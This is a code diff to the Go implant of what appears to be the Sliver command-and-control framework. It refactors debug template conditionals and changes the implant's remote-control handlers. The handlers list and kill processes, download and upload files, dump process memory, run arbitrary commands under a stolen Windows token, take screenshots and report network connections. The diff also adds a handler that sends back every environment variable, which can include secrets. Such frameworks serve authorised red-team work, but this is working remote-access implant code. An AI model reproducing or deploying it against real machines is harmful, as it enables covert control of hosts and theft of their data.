@@ -28,12 +28,13 @@ import (
 	"io/ioutil"
 	"net"
 	"os/exec"
+	"strings"
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
-	// {{if eq .GOOS "windows"}}
+	// {{if eq .Config.GOOS "windows"}}
 	"syscall"
 
 	"github.com/bishopfox/sliver/sliver/priv"
@@ -59,12 +60,12 @@ func pingHandler(data []byte, resp RPCResponse) {
 	ping := &sliverpb.Ping{}
 	err := proto.Unmarshal(data, ping)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("ping id = %d", ping.Nonce)
 	// {{end}}
 	data, err = proto.Marshal(ping)
@@ -75,14 +76,14 @@ func psHandler(data []byte, resp RPCResponse) {
 	psListReq := &sliverpb.PsReq{}
 	err := proto.Unmarshal(data, psListReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
 	}
 	procs, err := ps.Processes()
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("failed to list procs %v", err)
 		// {{end}}
 	}
@@ -108,7 +109,7 @@ func terminateHandler(data []byte, resp RPCResponse) {
 	terminateReq := &sliverpb.TerminateReq{}
 	err := proto.Unmarshal(data, terminateReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
@@ -120,7 +121,7 @@ func terminateHandler(data []byte, resp RPCResponse) {
 	} else {
 		err = ps.Kill(int(terminateReq.Pid))
 		if err != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("Failed to kill process %s", err)
 			// {{end}}
 			errStr = err.Error()
@@ -140,7 +141,7 @@ func dirListHandler(data []byte, resp RPCResponse) {
 	dirListReq := &sliverpb.LsReq{}
 	err := proto.Unmarshal(data, dirListReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
@@ -181,7 +182,7 @@ func rmHandler(data []byte, resp RPCResponse) {
 	rmReq := &sliverpb.RmReq{}
 	err := proto.Unmarshal(data, rmReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
@@ -222,7 +223,7 @@ func mkdirHandler(data []byte, resp RPCResponse) {
 	mkdirReq := &sliverpb.MkdirReq{}
 	err := proto.Unmarshal(data, mkdirReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
@@ -246,7 +247,7 @@ func cdHandler(data []byte, resp RPCResponse) {
 	cdReq := &sliverpb.CdReq{}
 	err := proto.Unmarshal(data, cdReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		resp([]byte{}, err)
@@ -261,7 +262,7 @@ func cdHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("cd '%s' -> %s", cdReq.Path, dir)
 	// {{end}}
 
@@ -273,7 +274,7 @@ func pwdHandler(data []byte, resp RPCResponse) {
 	pwdReq := &sliverpb.PwdReq{}
 	err := proto.Unmarshal(data, pwdReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		resp([]byte{}, err)
@@ -298,7 +299,7 @@ func downloadHandler(data []byte, resp RPCResponse) {
 	downloadReq := &sliverpb.DownloadReq{}
 	err := proto.Unmarshal(data, downloadReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		resp([]byte{}, err)
@@ -307,16 +308,21 @@ func downloadHandler(data []byte, resp RPCResponse) {
 	target, _ := filepath.Abs(downloadReq.Path)
 	fi, err := os.Stat(target)
 	if err != nil {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Printf("stat failed on %s: %v", target, err)
 		//{{end}}
-		resp([]byte{}, err)
+		download := &sliverpb.Download{Path: target, Exists: false}
+		download.Response = &commonpb.Response{
+			Err: err.Error(),
+		}
+		data, err = proto.Marshal(download)
+		resp(data, err)
 		return
 	}
 	if fi.IsDir() {
 		var dirData bytes.Buffer
 		err = compressDir(target, &dirData)
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error creating the archive: %v", err)
 		// {{end}}
 		rawData = dirData.Bytes()
@@ -349,7 +355,7 @@ func uploadHandler(data []byte, resp RPCResponse) {
 	uploadReq := &sliverpb.UploadReq{}
 	err := proto.Unmarshal(data, uploadReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		resp([]byte{}, err)
@@ -384,7 +390,7 @@ func dumpHandler(data []byte, resp RPCResponse) {
 	procDumpReq := &sliverpb.ProcessDumpReq{}
 	err := proto.Unmarshal(data, procDumpReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
@@ -405,7 +411,7 @@ func taskHandler(data []byte, resp RPCResponse) {
 	task := &sliverpb.TaskReq{}
 	err = proto.Unmarshal(data, task)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
@@ -442,7 +448,7 @@ func sideloadHandler(data []byte, resp RPCResponse) {
 
 func ifconfigHandler(_ []byte, resp RPCResponse) {
 	interfaces := ifconfig()
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("network interfaces: %#v", interfaces)
 	// {{end}}
 	data, err := proto.Marshal(interfaces)
@@ -480,40 +486,41 @@ func ifconfig() *sliverpb.Ifconfig {
 func executeHandler(data []byte, resp RPCResponse) {
 	var (
 		err error
-		cmd *exec.Cmd
 	)
 	execReq := &sliverpb.ExecuteReq{}
 	err = proto.Unmarshal(data, execReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
 	}
+
 	execResp := &sliverpb.Execute{}
-	if len(execReq.Args) != 0 {
-		cmd = exec.Command(execReq.Path, execReq.Args...)
-	} else {
-		cmd = exec.Command(execReq.Path)
-	}
-	//{{if eq .GOOS "windows"}}
+	cmd := exec.Command(execReq.Path, execReq.Args...)
+
+	//{{if eq .Config.GOOS "windows"}}
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		Token: syscall.Token(priv.CurrentToken),
 	}
 	//{{end}}
 
 	if execReq.Output {
-		res, err := cmd.Output()
-		//{{if .Debug}}
+		res, err := cmd.CombinedOutput()
+		//{{if .Config.Debug}}
 		log.Println(string(res))
 		//{{end}}
 		if err != nil {
-			execResp.Response = &commonpb.Response{
-				Err: fmt.Sprintf("%s", err),
+			// Exit errors are not a failure of the RPC, but of the command.
+			if exiterr, ok := err.(*exec.ExitError); ok {
+				execResp.Status = uint32(exiterr.ExitCode())
+			} else {
+				execResp.Response = &commonpb.Response{
+					Err: fmt.Sprintf("%s", err),
+				}
 			}
-		} else {
-			execResp.Result = string(res)
 		}
+		execResp.Result = string(res)
 	} else {
 		err = cmd.Start()
 		if err != nil {
@@ -530,12 +537,12 @@ func screenshotHandler(data []byte, resp RPCResponse) {
 	sc := &sliverpb.Screenshot{}
 	err := proto.Unmarshal(data, sc)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("Screenshot Request")
 	// {{end}}
 
@@ -549,7 +556,7 @@ func netstatHandler(data []byte, resp RPCResponse) {
 	netstatReq := &sliverpb.NetstatReq{}
 	err := proto.Unmarshal(data, netstatReq)
 	if err != nil {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		//{{end}}
 		return
@@ -562,7 +569,7 @@ func netstatHandler(data []byte, resp RPCResponse) {
 		if netstatReq.IP4 {
 			tabs, err := netstat.UDPSocks(netstat.NoopFilter)
 			if err != nil {
-				//{{if .Debug}}
+				//{{if .Config.Debug}}
 				log.Printf("netstat failed: %v", err)
 				//{{end}}
 				return
@@ -572,7 +579,7 @@ func netstatHandler(data []byte, resp RPCResponse) {
 		if netstatReq.IP6 {
 			tabs, err := netstat.UDP6Socks(netstat.NoopFilter)
 			if err != nil {
-				//{{if .Debug}}
+				//{{if .Config.Debug}}
 				log.Printf("netstat failed: %v", err)
 				//{{end}}
 				return
@@ -597,7 +604,7 @@ func netstatHandler(data []byte, resp RPCResponse) {
 		if netstatReq.IP4 {
 			tabs, err := netstat.TCPSocks(fn)
 			if err != nil {
-				//{{if .Debug}}
+				//{{if .Config.Debug}}
 				log.Printf("netstat failed: %v", err)
 				//{{end}}
 				return
@@ -608,7 +615,7 @@ func netstatHandler(data []byte, resp RPCResponse) {
 		if netstatReq.IP6 {
 			tabs, err := netstat.TCP6Socks(fn)
 			if err != nil {
-				//{{if .Debug}}
+				//{{if .Config.Debug}}
 				log.Printf("netstat failed: %v", err)
 				//{{end}}
 				return
@@ -621,37 +628,37 @@ func netstatHandler(data []byte, resp RPCResponse) {
 	}
 }
 
-func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEntry {
-	entries := make([]*sliverpb.SockTabEntry, 0)
-	for _, e := range s {
-		var (
-			pid  int32
-			exec string
-		)
-		if e.Process != nil {
-			pid = int32(e.Process.Pid)
-			exec = e.Process.Name
-		}
-		entries = append(entries, &sliverpb.SockTabEntry{
-			LocalAddr: &sliverpb.SockTabEntry_SockAddr{
-				Ip:   e.LocalAddr.String(),
-				Port: uint32(e.LocalAddr.Port),
-			},
-			RemoteAddr: &sliverpb.SockTabEntry_SockAddr{
-				Ip:   e.RemoteAddr.String(),
-				Port: uint32(e.RemoteAddr.Port),
-			},
-			SkState: e.State.String(),
-			UID:     e.UID,
-			Process: &commonpb.Process{
-				Pid:        pid,
-				Executable: exec,
-			},
-			Protocol: proto,
-		})
+func getEnvHandler(data []byte, resp RPCResponse) {
+	envReq := &sliverpb.EnvReq{}
+	err := proto.Unmarshal(data, envReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v\n", err)
+		// {{end}}
+		return
 	}
-	return entries
-
+	variables := os.Environ()
+	var envVars []*commonpb.EnvVar
+	envInfo := sliverpb.EnvInfo{}
+	if envReq.Name != "" {
+		envVars = make([]*commonpb.EnvVar, 1)
+		envVars[0] = &commonpb.EnvVar{
+			Key:   envReq.Name,
+			Value: os.Getenv(envReq.Name),
+		}
+	} else {
+		envVars = make([]*commonpb.EnvVar, len(variables))
+		for i, e := range variables {
+			pair := strings.SplitN(e, "=", 2)
+			envVars[i] = &commonpb.EnvVar{
+				Key:   pair[0],
+				Value: pair[1],
+			}
+		}
+	}
+	envInfo.Variables = envVars
+	data, err = proto.Marshal(&envInfo)
+	resp(data, err)
 }
 
 // ---------------- Data Encoders ----------------
@@ -719,4 +726,37 @@ func compressDir(path string, buf io.Writer) error {
 		return err
 	}
 	return nil
+}
+
+func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEntry {
+	entries := make([]*sliverpb.SockTabEntry, 0)
+	for _, e := range s {
+		var (
+			pid  int32
+			exec string
+		)
+		if e.Process != nil {
+			pid = int32(e.Process.Pid)
+			exec = e.Process.Name
+		}
+		entries = append(entries, &sliverpb.SockTabEntry{
+			LocalAddr: &sliverpb.SockTabEntry_SockAddr{
+				Ip:   e.LocalAddr.String(),
+				Port: uint32(e.LocalAddr.Port),
+			},
+			RemoteAddr: &sliverpb.SockTabEntry_SockAddr{
+				Ip:   e.RemoteAddr.String(),
+				Port: uint32(e.RemoteAddr.Port),
+			},
+			SkState: e.State.String(),
+			UID:     e.UID,
+			Process: &commonpb.Process{
+				Pid:        pid,
+				Executable: exec,
+			},
+			Protocol: proto,
+		})
+	}
+	return entries
+
 }
